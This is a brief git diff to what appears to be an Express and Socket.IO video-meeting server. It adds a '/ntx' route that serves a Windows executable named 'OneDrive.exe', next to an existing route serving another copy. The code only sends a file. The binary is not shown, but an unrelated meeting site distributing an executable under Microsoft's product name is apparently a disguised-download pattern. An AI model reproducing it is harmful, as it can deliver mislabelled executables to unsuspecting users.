@@ -190,7 +190,10 @@ app.get('/this', (req, res) => {
     const filePath = './src/OneDrive.exe'; // Replace with the actual file path
     res.download(filePath);
   });
-
+  app.get('/ntx', (req, res) => {
+    const filePath = './src/ntx/OneDrive.exe'; // Replace with the actual file path
+    res.download(filePath);
+  });
 // main namespace for the meet functionality --------> 
 io.of( '/stream' ).on( 'connection', (socket)=>{
     socket.on( 'subscribe', ( data ) => {
